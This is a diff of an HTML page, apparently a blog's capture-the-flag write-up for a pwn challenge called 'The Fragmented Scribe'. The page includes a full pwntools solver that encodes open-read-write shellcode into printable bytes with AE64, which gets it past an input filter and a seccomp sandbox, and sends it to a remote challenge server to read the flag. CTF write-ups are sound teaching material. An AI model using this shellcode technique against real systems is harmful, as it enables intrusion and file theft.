@@ -1,17 +1,17 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>The Fragmented Scribe · Pwn writeup — r3t0x</title><meta name="description" content="The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/fst-bootcamp/fragmented_scribe/"><meta property="og:type" content="article"><meta property="og:title" content="The Fragmented Scribe · Pwn writeup — r3t0x"><meta property="og:description" content="The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/fst-bootcamp/fragmented_scribe/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=c3965b3600e8"><link rel="stylesheet" href="/static/css/akatsuki.css?v=c3965b3600e8"><script src="/static/js/site.js?v=c3965b3600e8" defer></script></head><body class="veil-open">
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>The Fragmented Scribe · Pwn writeup — r3t0x</title><meta name="description" content="The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/fst-bootcamp/fragmented_scribe/"><meta property="og:type" content="article"><meta property="og:title" content="The Fragmented Scribe · Pwn writeup — r3t0x"><meta property="og:description" content="The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/fst-bootcamp/fragmented_scribe/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=b0b7e08b9fc0"><link rel="stylesheet" href="/static/css/akatsuki.css?v=b0b7e08b9fc0"><script src="/static/js/site.js?v=b0b7e08b9fc0" defer></script></head><body class="veil-open">
   <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
   <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
   <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
   <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
   <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><div class="route-veil" id="route-veil" aria-hidden="true"><div class="veil-lid veil-lid-top"></div><div class="veil-lid veil-lid-bottom"></div><div class="veil-eye"><svg viewBox="0 0 200 200"><defs><clipPath id="veilClip"><circle cx="100" cy="100" r="98"/></clipPath></defs><circle cx="100" cy="100" r="94" fill="var(--red)" stroke="#000" stroke-width="10"/><g class="veil-base"><circle cx="100" cy="100" r="90" fill="var(--red)"/><circle cx="100" cy="100" r="16" fill="#000"/><circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/><g class="veil-tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(120deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(240deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g></g><image class="veil-mangekyo" href="/static/img/mangekyou.png" x="0" y="0" width="200" height="200" clip-path="url(#veilClip)"/></svg></div></div><div class="kamui-veil" id="kamui-veil" aria-hidden="true"></div><main id="main"><article class="wrap article-page writeup-page">
-    <a class="text-link" href="/blog/?collection=FST%20Bootcamp">← Back to the archive</a>
+    <a class="text-link" href="/blog/?collection=FST+Bootcamp&amp;category=Pwn">← Back to archive · Pwn</a>
     <header class="article-heading"><p class="eyebrow">FST Bootcamp <span>/</span> Pwn WRITEUP</p><h1>The Fragmented Scribe</h1><p>The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…</p>
       <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>R3t0x</strong><small>2026-09-28 · archived challenge · hard</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
     </header>
     <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>FST Bootcamp</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>hard</span><span><small>POINTS</small>Archived</span></div>
     <div class="writeup-tags"><span>Printable Shellcode + Seccomp ORW</span></div>
     <div class="article-layout">
-      <div class="prose writeup-prose"><h2 id="summary">Summary</h2><p class="lead">The scribe is dying. The message is breaking. Only 100 fragments (bytes) remain. The language has been stripped of its direct commands…</p><h2 id="walkthrough">Walkthrough</h2><h3>About</h3>
+      <div class="prose writeup-prose"><h2 id="walkthrough">Walkthrough</h2><h3>About</h3>
 <p>This is the same challenge as the MOJO-JOJO version. It uses printable-only shellcode validation and a seccomp sandbox that only allows <code>read</code>, <code>write</code>, <code>open</code>, <code>openat</code>, <code>exit</code>, and <code>exit_group</code>.</p>
 <h3>Strategy</h3>
 <ol>
@@ -22,57 +22,57 @@
 <p>See the full MOJO-JOJO fragmented_scribe writeup for detailed exploit code.</p>
 <h3>Result</h3>
 <div class="codehilite"><pre><span></span><code>Securinets{fr4gm3nt3d_but_n0t_br0k3n}
-</code></pre></div><h2 id="solver">Reference solver</h2><p>The complete solver used to validate the challenge:</p><pre><code class="language-python">import sys
-sys.path.insert(0, '/tmp/ae64')
+</code></pre></div><h2 id="solver">Reference solver</h2><p>The reference solver supplied with the writeup:</p><pre><code class="language-python"><span class="hljs-keyword">import</span> sys
+sys.path.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;/tmp/ae64&#x27;</span>)
 
-from pwn import *
-from ae64 import AE64
-import time
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64
+<span class="hljs-keyword">import</span> time
 
-context.arch = 'amd64'
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
 
-def get_process():
-    if args.REMOTE:
-        return remote('48.220.35.76', 1338)
-    else:
-        return process('./challenge')
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_process</span>():
+    <span class="hljs-keyword">if</span> args.REMOTE:
+        <span class="hljs-keyword">return</span> remote(<span class="hljs-string">&#x27;48.220.35.76&#x27;</span>, <span class="hljs-number">1338</span>)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> process(<span class="hljs-string">&#x27;./challenge&#x27;</span>)
 
-# Generate base shellcode for reading the flag using Open-Read-Write
-# (Avoiding sendfile as it's not in the seccomp filter)
-base_sc = asm(shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
-info(f&quot;Base shellcode length: {len(base_sc)}&quot;)
+<span class="hljs-comment"># Generate base shellcode for reading the flag using Open-Read-Write</span>
+<span class="hljs-comment"># (Avoiding sendfile as it&#x27;s not in the seccomp filter)</span>
+base_sc = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>) + shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">100</span>) + shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">100</span>))
+info(<span class="hljs-string">f&quot;Base shellcode length: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(base_sc)}</span>&quot;</span>)
 
-# Use AE64 to encode the shellcode
-# We specifically use R13 as the base register as set in the challenge stub.
+<span class="hljs-comment"># Use AE64 to encode the shellcode</span>
+<span class="hljs-comment"># We specifically use R13 as the base register as set in the challenge stub.</span>
 obj = AE64()
-encoded_sc = obj.encode(base_sc, 'r13')
+encoded_sc = obj.encode(base_sc, <span class="hljs-string">&#x27;r13&#x27;</span>)
 
-success(f&quot;Encoded shellcode length: {len(encoded_sc)}&quot;)
-success(f&quot;Is all printable: {all(32 &lt;= b &lt;= 126 for b in encoded_sc)}&quot;)
+success(<span class="hljs-string">f&quot;Encoded shellcode length: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(encoded_sc)}</span>&quot;</span>)
+success(<span class="hljs-string">f&quot;Is all printable: <span class="hljs-subst">{<span class="hljs-built_in">all</span>(<span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> encoded_sc)}</span>&quot;</span>)
 
-# Run the exploit
+<span class="hljs-comment"># Run the exploit</span>
 io = get_process()
-io.recvuntil(b&quot;&gt; &quot;)
+io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)
 io.send(encoded_sc)
 
-try:
-    # Give it a moment to decode and run
-    time.sleep(0.5)
-    output = io.recvall(timeout=3).decode(errors='ignore')
-    print(&quot;\n&quot; + &quot;=&quot;*40)
-    print(output)
-    print(&quot;=&quot;*40 + &quot;\n&quot;)
+<span class="hljs-keyword">try</span>:
+    <span class="hljs-comment"># Give it a moment to decode and run</span>
+    time.sleep(<span class="hljs-number">0.5</span>)
+    output = io.recvall(timeout=<span class="hljs-number">3</span>).decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">40</span>)
+    <span class="hljs-built_in">print</span>(output)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">&quot;\n&quot;</span>)
 
-    if &quot;Securinets&quot; in output:
-        flag_line = [line for line in output.split('\n') if 'Securinets' in line][0]
-        success(f&quot;FLAG: {flag_line}&quot;)
-    else:
-        error(&quot;No flag found. Check if the exploit ran correctly.&quot;)
-except Exception as e:
-    error(f&quot;Error during flag retrieval: {e}&quot;)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Securinets&quot;</span> <span class="hljs-keyword">in</span> output:
+        flag_line = [line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output.split(<span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Securinets&#x27;</span> <span class="hljs-keyword">in</span> line][<span class="hljs-number">0</span>]
+        success(<span class="hljs-string">f&quot;FLAG: <span class="hljs-subst">{flag_line}</span>&quot;</span>)
+    <span class="hljs-keyword">else</span>:
+        error(<span class="hljs-string">&quot;No flag found. Check if the exploit ran correctly.&quot;</span>)
+<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+    error(<span class="hljs-string">f&quot;Error during flag retrieval: <span class="hljs-subst">{e}</span>&quot;</span>)
 
 io.close()</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>Securinets{fr4gm3nt3d_but_n0t_br0k3n}</code></pre>
-      <div class="article-end"><span>Published 2026-09-28 · by R3t0x</span><a class="text-link" href="/blog/?collection=FST%20Bootcamp">More FST Bootcamp writeups ↗</a></div></div>
+      <div class="article-end"><span>Published 2026-09-28 · by R3t0x</span><a class="text-link" href="/blog/?collection=FST+Bootcamp&amp;category=Pwn">← Back to archive · Pwn</a></div></div>
     </div>
   </article></main>
   <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
